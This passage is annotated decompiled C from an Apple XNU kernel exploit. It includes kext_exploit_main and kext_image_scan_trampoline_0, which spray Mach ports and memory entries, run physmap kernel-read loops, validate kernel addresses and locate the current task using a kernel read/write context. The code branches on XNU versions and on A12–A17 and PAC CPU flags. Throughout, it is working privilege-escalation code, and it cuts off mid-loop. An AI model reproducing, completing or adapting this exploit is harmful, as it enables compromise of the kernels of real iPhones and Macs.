    vm_address_t v36; // [xsp+34A0h] [xbp-3250h]
    vm_size_t v37; // [xsp+34A8h] [xbp-3248h]
    uint8_t v38[72]; // [xsp+34B0h] [xbp-3240h]
    mach_port_name_t v39; // [xsp+34F8h] [xbp-31F8h]
    uint8_t padding[0x315C];
  } locals;
  uint64_t args[3]; // [xsp+6658h] [xbp-98h] BYREF
  pthread_t thread; // [xsp+6670h] [xbp-80h] BYREF
  pthread_attr_t attr; // [xsp+6678h] [xbp-78h] BYREF
#define v25 locals.v25
#define address locals.address
#define size locals.size
#define v28 locals.v28
#define v29 locals.v29
#define v30 locals.v30
#define name locals.name
#define v32 locals.v32
#define v33 locals.v33
#define v34 locals.v34
#define v35 locals.v35
#define v36 locals.v36
#define v37 locals.v37
#define v38 locals.v38
#define v39 locals.v39

  v5 = (uint32_t *)x2;
  v7 = w1;
  v8 = x0;
  _Static_assert(sizeof(locals) == 0x6650, "kext_exploit_main local frame size mismatch");
  bzero(&locals, sizeof(locals));
  v25[0] = v7;
  v9 = pthread_attr_init(&attr);
  if ( v9 )
  {
    if ( v9 >= 0 )
      v10 = v9;
    else
      v10 = -v9;
    v11 = v10 | 0x40000000u;
  }
  else
  {
    v12 = pthread_attr_setdetachstate(&attr, 1);
    if ( v12
      || (args[2] = v8,
          thread = 0,
          args[0] = 0x1001,
          args[1] = (uint64_t)v25,
          threadEntry = (void *(__cdecl *)(void *))nullsub_1(kext_image_scan_init),
          (v12 = pthread_create(&thread, &attr, threadEntry, args)) != 0)
      || (v12 = pthread_join(thread, 0)) != 0 )
    {
      if ( v12 >= 0 )
        v14 = v12;
      else
        v14 = -v12;
      v11 = v14 | 0x40000000u;
      pthread_attr_destroy(&attr);
    }
    else
    {
      v11 = LODWORD(args[0]);
      pthread_attr_destroy(&attr);
      if ( !(uint32_t)v11 )
        *v5 = 0;
    }
  }
  v15 = mach_task_self_;
  if ( address && size )
  {
    vm_deallocate(mach_task_self_, address, size);
    address = 0;
    size = 0;
  }
  if ( v28 && v29 )
  {
    vm_deallocate(mach_task_self_, v28, v29);
    v28 = 0;
    v29 = 0;
  }
  for ( i = 0; i != 1024; i += 4 )
  {
    v17 = *(uint32_t *)&v30[i];
    if ( v17 + 1 >= 2 )
      mach_port_mod_refs(mach_task_self_, v17, 1u, -1);
    *(uint32_t *)&v30[i] = 0;
  }
  for ( j = 0; j != 64; j += 4 )
  {
    v19 = *(uint32_t *)&v38[j];
    if ( v19 + 1 >= 2 )
    {
      mach_port_mod_refs(v15, v19, 1u, -1);
      *(uint32_t *)&v38[j] = 0;
    }
  }
  if ( v36 && v37 )
  {
    vm_deallocate(v15, v36, v37);
    v36 = 0;
    v37 = 0;
  }
  if ( v34 && v35 )
  {
    vm_deallocate(v15, v34, v35);
    v34 = 0;
    v35 = 0;
  }
  if ( name + 1 >= 2 )
  {
    mach_port_deallocate(v15, name);
    name = 0;
  }
  if ( v39 + 1 >= 2 )
  {
    mach_port_deallocate(v15, v39);
    v39 = 0;
  }
  v20 = v32;
  if ( v32 )
  {
    v21 = v33;
    if ( v33 )
    {
      v22 = 0;
      do
      {
        v23 = v20[v22];
        if ( v23 + 1 >= 2 )
        {
          mach_port_deallocate(v15, v23);
          v20 = v32;
          *((uint32_t *)v32 + v22) = 0;
          v21 = v33;
        }
        ++v22;
      }
      while ( v22 < v21 );
    }
    free(v20);
  }
#undef v25
#undef address
#undef size
#undef v28
#undef v29
#undef v30
#undef name
#undef v32
#undef v33
#undef v34
#undef v35
#undef v36
#undef v37
#undef v38
#undef v39
  return v11;
}
// CB98: variables would overlap: w1.4 and x1.8
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (000000000000CE78) ----------------------------------------------------
__int64 __fastcall kext_exploit_main_trampoline(uint64_t x0, uint64_t x1_idk, uint32_t w2, uint64_t x3)
{
  return kext_exploit_main(x0, 3u, x3);
}

//----- (000000000000CE84) ----------------------------------------------------
__int64 __fastcall kext_image_scan_init(uint64_t *a1)
{
  *(uint32_t *)a1 = kext_image_scan_trampoline_0(a1[2], a1[1]);
  return 0;
}

//----- (000000000000CEB8) ----------------------------------------------------
__int64 __fastcall kext_image_scan_trampoline_0(struct_krwCtx *x0, uint64_t x1)
{
  __int64 v4; // x20
  __int64 v5; // x19
  __int64 v6; // x27
  unsigned __int64 v7; // x0
  kern_return_t memory_entry; // w0
  vm_size_t v9; // x21
  __int64 v10; // x22
  __int64 i; // x21
  mach_port_name_t v13; // w0
  void *v14; // x0
  size_t v15; // x21
  void *v16; // x0
  int v17; // w8
  unsigned __int64 v18; // x21
  int v19; // w2
  __int64 j; // x21
  mach_msg_bits_t msgh_bits; // w1
  unsigned __int64 v22; // x8
  __int64 v23; // x0
  __int64 v24; // x23
  pid_t v25; // w0
  __int64 addr_v24; // x24
  __int64 v27; // x8
  __int64 v28; // x8
  __int64 v29; // x9
  __int64 v30; // x21
  int v31; // w0
  __int64 v32; // x0
  uintptr_t v33; // x24
  __int64 v34; // x8
  uint64_t *v35; // x21
  __int64 v36; // x8
  unsigned int v37; // w9
  uint32_t *v38; // x10
  __int64 v39; // x11
  mach_port_t v40; // w9
  vm_prot_t v41; // w3
  unsigned int v42; // w8
  __int64 v43; // x24
  int8x8_t *v44; // x13
  int8x8_t *v45; // x14
  int8x8_t v46; // x9
  __int64 v47; // x15
  uint64_t *v48; // x25
  __int64 v49; // x8
  unsigned int v50; // w23
  uintptr_t v51; // x22
  char *v52; // x21
  unsigned int v53; // w8
  bool v54; // zf
  __int64 v55; // x22
  uint8x8_t v56; // d0
  __int64 v57; // x23
  kern_return_t v58; // w0
  int v59; // w22
  __int64 k; // x21
  vm_address_t v61; // x1
  unsigned __int64 v62; // x24
  int8x8_t *v63; // x21
  int8x8_t *v64; // x21
  int8x8_t v65; // t1
  int8x8_t *v66; // x9
  unsigned int v67; // w8
  uint8x8_t v68; // d0
  int v69; // w8
  int v70; // w0
  __int64 v71; // x0
  unsigned int v72; // w25
  char v73; // w22
  __int64 v74; // x8
  __int64 v75; // x8
  unsigned int v76; // w8
  mach_port_t v77; // w8
  mach_msg_return_t v78; // w0
  __int64 v79; // x9
  __int64 v80; // x11
  vm_size_t v81; // x12
  vm_size_t v82; // x13
  int8x8_t v83; // x10
  __int64 v84; // x14
  uint64_t *v85; // x15
  unsigned int v86; // w16
  unsigned int m; // w17
  uint64_t *v88; // x0
  __int64 v89; // x1
  vm_size_t v90; // x2
  char *v91; // x3
  uint8x8_t v92; // d0
  unsigned int v93; // w0
  __int64 v94; // x0
  __int64 v95; // x8
  mach_port_name_t v96; // w4
  mach_msg_return_t v97; // w0
  unsigned int v98; // w25
  vm_address_t v99; // x22
  vm_size_t msgh_voucher_port; // x21
  vm_address_t v101; // x8
  char v102; // w8
  unsigned int v103; // w8
  unsigned __int64 v104; // x21
  __int64 v105; // x9
  mach_port_name_t v106; // w1
  __int64 v107; // x21
  mach_port_name_t v108; // w1
  __int64 v109; // x0
  mach_port_t v110; // w0
  unsigned __int64 ipc_port; // x0
  __int64 v112; // x8
  __int64 v113; // x25
  __int64 v114; // x21
  __int64 v115; // x0
  __int64 v116; // x1
  __int64 v117; // x8
  int v118; // w0
  unsigned __int64 v120; // x8
  uint64_t *v121; // x8
  unsigned __int64 v122; // x1
  unsigned int v123; // w8
  __int64 v124; // x21
  __int64 v125; // x24
  mach_port_name_t v126; // w22
  unsigned __int64 v127; // x0
  __int64 v128; // x0
  unsigned __int64 v129; // x23
  __int64 v130; // x23
  __int64 v131; // x24
  __int64 v132; // x8
  unsigned int v133; // w1
  __int64 v134; // x0
  unsigned __int64 v135; // x22
  unsigned __int64 v136; // x0
  __int64 v137; // x0
  unsigned __int64 v138; // x22
  kern_return_t v139; // w0
  __int64 ii; // x21
  vm_address_t v141; // x1
  __int64 jj; // x21
  vm_address_t v143; // x1
  __int64 v144; // x8
  char v145; // w9
  char v146; // w21
  __int64 v147; // x25
  vm_address_t v148; // x1
  kern_return_t v149; // w0
  int has_flag; // w22
  __int64 v151; // x8
  char *v152; // x1
  __int64 v153; // x22
  unsigned __int64 v154; // x0
  unsigned __int64 v155; // x0
  unsigned __int64 v156; // x21
  __int64 v157; // x25
  __int64 v158; // x8
  int v159; // w22
  __int64 v160; // x8
  unsigned __int64 v161; // x0
  __int64 v162; // x25
  __int64 v163; // x8
  __int64 v164; // x9
  int v165; // w0
  unsigned __int64 v166; // x0
  __int64 v167; // x8
  unsigned __int64 v168; // x0
  __int64 v169; // x8
  __int64 v170; // x8
  unsigned __int64 v171; // x9
  unsigned __int64 v172; // x8
  __int64 v173; // x0
  vm_size_t v174; // x23
  unsigned __int64 v175; // x0
  __int64 v176; // x24
  unsigned __int64 v177; // x0
  unsigned __int64 v178; // x21
  unsigned __int64 v179; // x0
  unsigned __int64 v180; // x25
  __int64 v181; // x25
  vm_address_t v182; // x1
  __int64 v183; // x8
  __int64 v184; // x8
  __int64 v185; // x8
  io_service_t v186; // w0
  io_service_t v187; // w24
  mach_port_t v188; // w21
  __int64 n; // x25
  io_connect_t v190; // w0
  int v192; // w8
  const void **v193; // x0
  const void *v194; // x22
  const void **v195; // x0
  const void *v196; // x23
  const void **v197; // x0
  const void *v198; // x24
  const struct __CFData *v199; // x0
  const struct __CFData *v200; // x24
  int v201; // w8
  uint32_t v202; // w25
  mem_entry_name_port_t *v203; // x23
  const UInt8 *BytePtr; // x22
  size_t Length; // x0
  mach_msg_bits_t v206; // w9
  __int64 v207; // x10
  unsigned __int64 v208; // x23
  int v209; // w0
  __int64 v210; // x24
  int v211; // w0
  unsigned __int64 v212; // x25
  vm_address_t v213; // x24
  vm_address_t v214; // x8
  __int64 v215; // x21
  unsigned __int64 v216; // x0
  unsigned int v217; // w8
  unsigned __int64 v218; // x21
  __int64 v219; // x23
  mach_port_name_t v220; // w1
  unsigned int v221; // w8
  unsigned __int64 v222; // x21
  __int64 v223; // x23
  vm_address_t v224; // x1
  unsigned __int64 v225; // x8
  bool v226; // cc
  int pipe; // w20
  unsigned int v228; // w0
  unsigned int v229; // w24
  unsigned int v230; // w0
  int v231; // w22
  int v232; // w23
  int v233; // w0
  int v234; // w0
  unsigned int v235; // w0
  unsigned __int64 v236; // x0
  __int64 v237; // x22
  int v238; // w1
  integer_t v239; // w10
  mem_entry_name_port_t v240; // w9
  mem_entry_name_port_t v241; // w8
  int v242; // w20
  int v243; // w8
  int v244; // w20
  int v245; // w8
  size_t v246; // x21
  mach_msg_bits_t v247; // w1
  mach_msg_size_t msgh_size; // w9
  __int64 v249; // x8
  __int64 v250; // x8
  unsigned __int64 v251; // x20
  unsigned __int64 v252; // x24
  unsigned __int64 v253; // x26
  int v254; // w25
  int v255; // w0
  vm_address_t v256; // x8
  bool v257; // cf
  int v258; // w8
  mach_port_t *v259; // [xsp+30h] [xbp-1120h]
  unsigned int *v260; // [xsp+40h] [xbp-1110h]
  __int64 v261; // [xsp+48h] [xbp-1108h]
  __int64 v262; // [xsp+50h] [xbp-1100h]
  unsigned __int64 v263; // [xsp+50h] [xbp-1100h]
  __int64 v264; // [xsp+58h] [xbp-10F8h]
  __int64 v265; // [xsp+58h] [xbp-10F8h]
  __int64 v266; // [xsp+60h] [xbp-10F0h]
  __int64 v267; // [xsp+60h] [xbp-10F0h]
  __int64 v268; // [xsp+68h] [xbp-10E8h]
  __int64 v269; // [xsp+68h] [xbp-10E8h]
  unsigned __int64 v270; // [xsp+68h] [xbp-10E8h]
  mach_port_name_t v271[2]; // [xsp+70h] [xbp-10E0h]
  mach_port_name_t v272; // [xsp+70h] [xbp-10E0h]
  __int64 v273; // [xsp+70h] [xbp-10E0h]
  uintptr_t value; // [xsp+78h] [xbp-10D8h]
  unsigned __int64 valuea; // [xsp+78h] [xbp-10D8h]
  int v276; // [xsp+80h] [xbp-10D0h]
  unsigned __int64 v277; // [xsp+80h] [xbp-10D0h]
  int v278; // [xsp+80h] [xbp-10D0h]
  int v279; // [xsp+80h] [xbp-10D0h]
  vm_size_t v280; // [xsp+88h] [xbp-10C8h]
  unsigned int *v281; // [xsp+90h] [xbp-10C0h]
  __int64 v282; // [xsp+90h] [xbp-10C0h]
  __int64 v283; // [xsp+90h] [xbp-10C0h]
  unsigned __int64 v284; // [xsp+90h] [xbp-10C0h]
  __int64 v285; // [xsp+90h] [xbp-10C0h]
  uintptr_t theDict; // [xsp+98h] [xbp-10B8h]
  CFMutableDictionaryRef theDicta; // [xsp+98h] [xbp-10B8h]
  CFMutableDictionaryRef theDictb; // [xsp+98h] [xbp-10B8h]
  CFMutableDictionaryRef theDictc; // [xsp+98h] [xbp-10B8h]
  CFMutableDictionaryRef theDictd; // [xsp+98h] [xbp-10B8h]
  CFMutableDictionaryRef theDicte; // [xsp+98h] [xbp-10B8h]
  unsigned __int64 kobject; // [xsp+A0h] [xbp-10B0h]
  unsigned __int64 v293; // [xsp+A0h] [xbp-10B0h]
  int8x8_t *v294; // [xsp+A8h] [xbp-10A8h]
  vm_size_t v295; // [xsp+A8h] [xbp-10A8h]
  vm_size_t v296; // [xsp+A8h] [xbp-10A8h]
  vm_size_t v297; // [xsp+A8h] [xbp-10A8h]
  int8x8_t *__handle; // [xsp+B0h] [xbp-10A0h]
  uint32_t *__handlea; // [xsp+B0h] [xbp-10A0h]
  char *__handleb; // [xsp+B0h] [xbp-10A0h]
  unsigned __int64 __handlec; // [xsp+B0h] [xbp-10A0h]
  void *__handled; // [xsp+B0h] [xbp-10A0h]
  unsigned __int64 __handlee; // [xsp+B0h] [xbp-10A0h]
  struct_krwCtx *krwCtx;
  char *v304; // [xsp+B8h] [xbp-1098h]
  unsigned int v305; // [xsp+B8h] [xbp-1098h]
  vm_size_t size; // [xsp+C0h] [xbp-1090h] BYREF
  mem_entry_name_port_t object_handle; // [xsp+CCh] [xbp-1084h] BYREF
  integer_t port_info; // [xsp+D0h] [xbp-1080h] BYREF
  vm_address_t address; // [xsp+D8h] [xbp-1078h] BYREF
  mach_msg_header_t name; // [xsp+E0h] [xbp-1070h] BYREF
  unsigned __int64 v311; // [xsp+100h] [xbp-1050h]
  vm_address_t v312; // [xsp+110h] [xbp-1040h] BYREF
  unsigned __int64 v313; // [xsp+118h] [xbp-1038h] BYREF
  int v314; // [xsp+124h] [xbp-102Ch] BYREF
  __int64 v315; // [xsp+128h] [xbp-1028h] BYREF
  __int64 v316; // [xsp+130h] [xbp-1020h] BYREF
  __int64 v317; // [xsp+138h] [xbp-1018h] BYREF
  size_t outputStructCnt; // [xsp+140h] [xbp-1010h] BYREF
  mem_entry_name_port_t v319[2]; // [xsp+148h] [xbp-1008h] BYREF
  integer_t a1[4]; // [xsp+150h] [xbp-1000h] BYREF
  struct
  {
    mach_msg_header_t outputStruct[2]; // [xsp+170h] [xbp-FE0h] BYREF
    __int128 v323; // [xsp+1A0h] [xbp-FB0h]
    __int128 v324; // [xsp+1B0h] [xbp-FA0h]
    __int128 v325; // [xsp+1C0h] [xbp-F90h]
    __int128 v326; // [xsp+1D0h] [xbp-F80h]
    __int128 v327; // [xsp+1E0h] [xbp-F70h]
    __int128 v328; // [xsp+1F0h] [xbp-F60h]
    __int128 v329; // [xsp+200h] [xbp-F50h]
    __int128 v330; // [xsp+210h] [xbp-F40h]
    __int128 v331; // [xsp+220h] [xbp-F30h]
    __int128 v332; // [xsp+230h] [xbp-F20h]
    __int128 v333; // [xsp+240h] [xbp-F10h]
    __int128 v334; // [xsp+250h] [xbp-F00h]
    __int128 v335; // [xsp+260h] [xbp-EF0h]
    uint8_t padding[0xE60];
  } outputScratch;
#define outputStruct outputScratch.outputStruct
#define v323 outputScratch.v323
#define v324 outputScratch.v324
#define v325 outputScratch.v325
#define v326 outputScratch.v326
#define v327 outputScratch.v327
#define v328 outputScratch.v328
#define v329 outputScratch.v329
#define v330 outputScratch.v330
#define v331 outputScratch.v331
#define v332 outputScratch.v332
#define v333 outputScratch.v333
#define v334 outputScratch.v334
#define v335 outputScratch.v335

  v4 = x1;
  v5 = x0;
  krwCtx = KRWCTX_FROM_UINTPTR(v5);
  v6 = 708625;
  _Static_assert(sizeof(outputScratch) == 0xF60, "kext_image_scan_trampoline_0 output scratch size mismatch");
  address = 0;
  object_handle = 0;
  size = vm_page_size;
  v7 = comm_page_memory_size();
  *(uint64_t *)(v4 + 8) = v7;
  *(uint64_t *)(v4 + 0x34E8) = 0x10000000800LL;
  if ( v7 > 0x400000000LL )
    return 708616;
  memory_entry = vm_allocate(mach_task_self_, &address, 0x2000u, 1);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  *(uint64_t *)(v4 + 13464) = address;
  *(uint64_t *)(v4 + 13472) = 0x2000;
  *(uint64_t *)&outputStruct[0].msgh_bits = 0;
  v9 = vm_page_size;
  memory_entry = vm_map(
                   mach_task_self_,
                   (vm_address_t *)&outputStruct[0].msgh_bits,
                   129 * vm_page_size,
                   0x1FFFFFFu,
                   -922746879,
                   0,
                   0,
                   0,
                   3,
                   3,
                   1u);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  *(uint64_t *)(v4 + 13448) = *(uint64_t *)&outputStruct[0].msgh_bits;
  *(uint64_t *)(v4 + 13456) = vm_page_size + (v9 << 7);
  for ( i = 3370; i != 3386; ++i )
  {
    v13 = mach_reply_port();
    if ( v13 + 1 < 2 )
      return 4097;
    *(uint32_t *)(v4 + 4 * i) = v13;
    port_info = 1024;
    memory_entry = mach_port_set_attributes(mach_task_self_, v13, 1, &port_info, 1u);
    if ( memory_entry )
      return memory_entry | 0x80000000;
  }
  memory_entry = mach_make_memory_entry(mach_task_self_, &size, 0, 131075, &object_handle, 0);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  *(uint32_t *)(v4 + 13424) = object_handle;
  v14 = calloc(0x200000u, 4u);
  if ( !v14 )
    return 708617;
  *(uint64_t *)(v4 + 13432) = v14;
  *(uint32_t *)(v4 + 13440) = 0x200000;
  *(uint64_t *)&outputStruct[0].msgh_bits = 0;
  v15 = vm_page_size << 9;
  memory_entry = vm_allocate(mach_task_self_, (vm_address_t *)&outputStruct[0].msgh_bits, vm_page_size << 9, -872415231);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  v16 = *(void **)&outputStruct[0].msgh_bits;
  *(uint64_t *)(v4 + 11296) = *(uint64_t *)&outputStruct[0].msgh_bits;
  *(uint64_t *)(v4 + 11304) = v15;
  if ( madvise(v16, v15, 3) )
  {
LABEL_15:
    v17 = errno;
    if ( v17 < 0 )
      v17 = -v17;
    return v17 | 0x40000000u;
  }
  v18 = -2;
  do
  {
    v18 += 2LL;
    if ( (v18 & 2) != 0 )
      v19 = 1;
    else
      v19 = 2;
    if ( madvise((void *)(*(uint64_t *)&outputStruct[0].msgh_bits + vm_page_size * v18), 2 * vm_page_size, v19) )
      goto LABEL_15;
  }
  while ( v18 < 0x1FE );
  for ( j = 2832; j != 3088; ++j )
  {
    name.msgh_bits = 0;
    memory_entry = mach_port_allocate(mach_task_self_, 1u, &name.msgh_bits);
    if ( memory_entry )
      return memory_entry | 0x80000000;
    msgh_bits = name.msgh_bits;
    *(uint32_t *)(v4 + 4 * j) = name.msgh_bits;
    a1[0] = 1024;
    memory_entry = mach_port_set_attributes(mach_task_self_, msgh_bits, 1, a1, 1u);
    if ( memory_entry )
      return memory_entry | 0x80000000;
  }
  v260 = (unsigned int *)(v4 + 17988);
  v22 = *(uint64_t *)(v5 + 344);
  if ( v22 > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) )
  {
    if ( (*(uint8_t *)v5 & 0x20) != 0 )
    {
      v10 = setup_kernel_region_via_flags(krwCtx);
      if ( (uint32_t)v10 )
        return v10;
      v23 = get_iogpu_physmap_base(v5);
      if ( v23 )
      {
        v24 = v23;
        v25 = getpid();
        addr_v24 = krw_task_for_pid_0(krwCtx, v24, v25);
        *(uint64_t *)(v4 + 11280) = addr_v24;
        goto LABEL_207;
      }
      return 163878;
    }
    goto LABEL_36;
  }
  if ( v22 > XNU_VERSION_PACKED(10002, 2, 12, 1023, 1023) || (v22 >= XNU_VERSION_PACKED(8796, 142, 1, 700, 14) && *(int *)(v5 + 320) < 10002) )
  {
LABEL_36:
    theDict = 68;
    v262 = 184;
    v27 = 88;
    goto LABEL_40;
  }
  theDict = 60;
  v262 = 176;
  v27 = 80;
LABEL_40:
  *(uint64_t *)v271 = v27;
  arc4random_buf((void *)(v4 + 13584), 8u);
  arc4random_buf(&((PhysmapLoopState *)v4)->marker, 8u);
  v28 = *(uint64_t *)(v4 + 13448);
  v10 = 708609;
  if ( !v28 )
    return v10;
  v29 = *(uint64_t *)(v4 + 13456);
  if ( !v29 )
    return 708609;
  madvise((void *)(v29 + v28 - vm_page_size), vm_page_size, 3);
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
  {
    v57 = 0;
    v334 = 0u;
    v335 = 0u;
    v332 = 0u;
    v333 = 0u;
    v330 = 0u;
    v331 = 0u;
    v328 = 0u;
    v329 = 0u;
    v326 = 0u;
    v327 = 0u;
    v324 = 0u;
    v325 = 0u;
    v323 = 0u;
    memset(outputStruct, 0, sizeof(outputStruct));
    while ( 1 )
    {
      v58 = vm_map(
              mach_task_self_,
              (vm_address_t *)((char *)&outputStruct[0].msgh_bits + v57),
              0x2000000u,
              0x1FFFFFFu,
              -939524087,
              0,
              0,
              0,
              3,
              3,
              1u);
      if ( v58 != 3 )
      {
        v59 = v58;
        if ( v58 )
          goto LABEL_110;
        if ( madvise(*(void **)((char *)&outputStruct[0].msgh_bits + v57), vm_page_size, 3) )
          break;
      }
      v57 += 8;
      if ( v57 == 256 )
      {
        v59 = 0;
        goto LABEL_110;
      }
    }
    v59 = 5;
LABEL_110:
    for ( k = 0; k != 256; k += 8 )
    {
      v61 = *(uint64_t *)((char *)&outputStruct[0].msgh_bits + k);
      if ( v61 )
      {
        vm_deallocate(mach_task_self_, v61, 0x2000000u);
        *(uint64_t *)((char *)&outputStruct[0].msgh_bits + k) = 0;
      }
    }
    if ( v59 )
      return v59 | 0x80000000;
  }
  v30 = 0;
  v268 = 0;
  v304 = 0;
  v24 = 688;
  while ( 1 )
  {
    get_page_size();
    if ( *(uint32_t *)v4 != 3 )
    {
      v31 = 4;
LABEL_50:
      v10 = v31 | 0x80000000;
      goto LABEL_51;
    }
    PhysmapReadResult *activeResult = physmap_read_result_at(v4, v30);
    v31 = kernel_read_loop_physmap(v5, v4, 0x10u, (__int64)activeResult);
    if ( v31 )
      goto LABEL_50;
    get_page_size();
    v294 = (int8x8_t *)activeResult;
    v32 = physmap_read_rebuild_page((uint64_t *)v4, v294);
    if ( !(uint32_t)v32 )
      break;
    v10 = v32;
LABEL_51:
    if ( ++v30 == 16 )
      goto LABEL_205;
  }
  v261 = v30;
  get_page_size();
  if ( !*(uint32_t *)(v4 + 13440) )
  {
    get_page_size();
LABEL_100:
    v10 = 708620;
    goto LABEL_101;
  }
  v33 = 0;
  v264 = *(uint64_t *)(v4 + 13432);
  v266 = *(unsigned int *)(v4 + 13544);
  v259 = (mach_port_t *)(v4 + 4 * v30 + 13480);
  PhysmapReadResult *scanResult = physmap_read_result_at(v4, v30);
  v34 = (__int64)scanResult - 16;
  v281 = &scanResult->pageCount;
  v276 = -(int)v266;
  v10 = 708620;
  v35 = &((PhysmapLoopState *)v4)->marker;
  kobject = (__int64)&scanResult->processedPageMask;
  do
  {
    a1[0] = 0;
    *(uint64_t *)&name.msgh_bits = vm_page_size;
    if ( v33 && !(v33 % (unsigned int)v266) )
    {
      v36 = *(uint64_t *)(v4 + 13464);
      if ( (uint32_t)v266 )
      {
        v37 = v276;
        v38 = *(uint32_t **)(v4 + 13464);
        v39 = v266;
        do
        {
          *v38++ = *(uint32_t *)(v264 + 4LL * v37);
          *(uint32_t *)(v264 + 4LL * v37++) = 0;
          --v39;
        }
        while ( v39 );
      }
      *(uint64_t *)&outputStruct[0].msgh_bits = 0x2C80001514LL;
      v40 = *v259;
      *(__int128 *)&outputStruct[0].msgh_local_port = xmmword_42EC0;
      *(uint64_t *)&outputStruct[1].msgh_size = v36;
      outputStruct[1].msgh_voucher_port = v266;
      outputStruct[0].msgh_remote_port = v40;
      outputStruct[1].msgh_local_port = 34668544;
      if ( mach_msg(outputStruct, 262161, 0x2Cu, 0, 0, 0, 0) )
        break;
    }
    v41 = v304 ? 67248131 : 67239939;
    if ( mach_make_memory_entry(mach_task_self_, (vm_size_t *)&name.msgh_bits, 0, v41, (mem_entry_name_port_t *)a1, 0) )
      break;
    value = v33;
    *(uint32_t *)(v264 + 4LL * v33) = a1[0];
    v42 = *v281;
    if ( !*v281 )
      goto LABEL_92;
    v43 = 0;
    v45 = (int8x8_t *)kobject;
    v44 = v294;
    v46 = *(int8x8_t *)kobject;
    while ( 1 )
    {
      v47 = 1LL << v43;
      if ( ((1LL << v43) & *(uint64_t *)&v46) != 0 )
        goto LABEL_89;
      v48 = (uint64_t *)(*(uint64_t *)v44 + vm_page_size * v43);
      if ( *v48 == *v35 )
        goto LABEL_89;
      if ( vm_page_size )
        break;
LABEL_88:
      *(uint64_t *)&v46 |= v47;
      *v45 = v46;
      v10 = 708625;
LABEL_89:
      if ( ++v43 >= (unsigned __int64)v42 )
        goto LABEL_93;
    }
    v49 = 0;
    v50 = 0;
    v51 = theDict;
    while ( 1 )
    {
      v52 = (char *)v48 + v49;
      v53 = *(uint32_t *)((char *)v48 + v49 + 40);
      if ( v53 > 0x80 )
      {
LABEL_87:
        v46 = *v45;
        v35 = &((PhysmapLoopState *)v4)->marker;
        v42 = *v281;
        goto LABEL_88;
      }
      if ( *(uint32_t *)v52 && *(uint32_t *)v52 == *((uint32_t *)v52 + 1) )
      {
        v54 = *((unsigned __int8 *)v52 + v51) != 128 && v53 == 1;
        if ( v54 && *((uint64_t *)v52 + 3) == *(uint64_t *)&name.msgh_bits )
          break;
      }
LABEL_86:
      v50 += *(uint32_t *)(v4 + 13548);
      v49 = v50;
      if ( vm_page_size <= v50 )
        goto LABEL_87;
    }
    if ( v304 )
    {
      v268 = *(uint64_t *)&v52[*(uint64_t *)v271];
      if ( validate_kaddr_range(v5, v268) )
      {
        v10 = 0;
        *(uint64_t *)kobject |= 1LL << v43;
        break;
      }
      goto LABEL_85;
    }
    v55 = *(uint64_t *)&v52[v262];
    if ( !validate_kaddr_range(v5, v55) )
    {
      v304 = 0;
      v51 = theDict;
LABEL_85:
      v45 = (int8x8_t *)kobject;
      v44 = v294;
      v47 = 1LL << v43;
      goto LABEL_86;
    }
    *(uint32_t *)(v264 + 4LL * value) = 0;
    *(uint32_t *)(v4 + 13552) = a1[0];
    *(uint64_t *)(v4 + 13560) = v55 - v262;
    v42 = *v281;
    v10 = 708625;
    v304 = v52;
    v35 = &((PhysmapLoopState *)v4)->marker;
LABEL_92:
    v45 = (int8x8_t *)kobject;
LABEL_93:
    v56 = (uint8x8_t)vcnt_s8(*v45);
    v56.i16[0] = vaddlv_u8(v56);
    if ( v42 == v56.i32[0] )
      break;
    v33 = value + 1;
    ++v276;
  }
  while ( value + 1 < *(unsigned int *)(v4 + 13440) );
  get_page_size();
  if ( (uint32_t)v10 == 708620 )
    goto LABEL_100;
  if ( (uint32_t)v10 == 708625 )
  {
LABEL_101:
    v30 = v261;
    v24 = 688;
    goto LABEL_51;
  }
  *(uint64_t *)(v4 + 11280) = v268;
  if ( !validate_kaddr_range(v5, v268) )
    return 163878;
  v62 = (unsigned int)v261;
  while ( 2 )
  {
    PhysmapReadResult *retryResult = physmap_read_result_at(v4, v62);
    v64 = (int8x8_t *)retryResult;
    if ( !retryResult->mapping || !retryResult->processedPageMask )
    {
      get_page_size();
      if ( *(uint32_t *)v4 == 3 )
      {
        v70 = kernel_read_loop_physmap(v5, v4, 0x10u, (__int64)retryResult);
        if ( !v70 )
        {
          get_page_size();
          v71 = physmap_read_rebuild_page((uint64_t *)v4, (int8x8_t *)retryResult);
          if ( !(uint32_t)v71 )
          {
            get_page_size();
            v67 = retryResult->pageCount;
            goto LABEL_134;
          }
          v10 = v71;
LABEL_128:
          v69 = 41;
          goto LABEL_129;
        }
      }
      else
      {
        v70 = 4;
      }
      v10 = v70 | 0x80000000;
      goto LABEL_128;
    }
    v67 = retryResult->pageCount;
    v68 = (uint8x8_t)vcnt_s8(*(int8x8_t *)&retryResult->processedPageMask);
    v68.i16[0] = vaddlv_u8(v68);
    if ( v67 == v68.i32[0] )
    {
      v69 = 41;
      v10 = 708625;
      goto LABEL_129;
    }
LABEL_134:
    if ( v67 <= 0x40 )
    {
      if ( *(uint64_t *)(v5 + 344) >> 43 < 0x44Bu )
        v72 = 0;
      else
        v72 = *(uint32_t *)(v5 + 384) % 0x50u;
      v282 = *(uint64_t *)(v4 + 11304) + *(uint64_t *)(v4 + 11296);
      theDicta = *(CFMutableDictionaryRef *)(v4 + 11296);
      v73 = vm_page_shift;
      kobject = (__int64)&retryResult->pageCount;
      __handle = (int8x8_t *)&retryResult->processedPageMask;
      LODWORD(v74) = *(uint32_t *)(v4 + 12352);
      do
      {
        if ( (unsigned int)v74 > 0xFF )
        {
LABEL_195:
          v10 = 708620;
          goto LABEL_196;
        }
        v75 = (unsigned int)v74 + 3089LL;
        while ( *(uint32_t *)(v4 + 4 * v75) >= 0x400u )
        {
          if ( (uint32_t)++v75 == 3345 )
            goto LABEL_195;
        }
        v76 = v75 - 3089;
        *(uint32_t *)(v4 + 12352) = v76;
        *(uint64_t *)&outputStruct[0].msgh_bits = 0x2C80000014LL;
        v77 = *(uint32_t *)(v4 + 11296 + 4LL * v76 + 32);
